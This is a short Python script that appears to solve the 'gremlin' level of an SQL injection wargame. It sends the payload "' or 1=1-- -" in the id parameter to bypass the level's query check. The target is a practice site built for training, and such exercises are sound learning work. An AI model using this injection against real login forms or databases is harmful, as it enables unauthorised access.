from constants import *

chall_url = "https://los.rubiya.kr/chall/gremlin_280c5552de8b681110e9287421b834fd.php"

res = make_request(chall_url, "?id=" + urllib.parse.quote(f"' or 1=1-- -"))
check_clear(res)
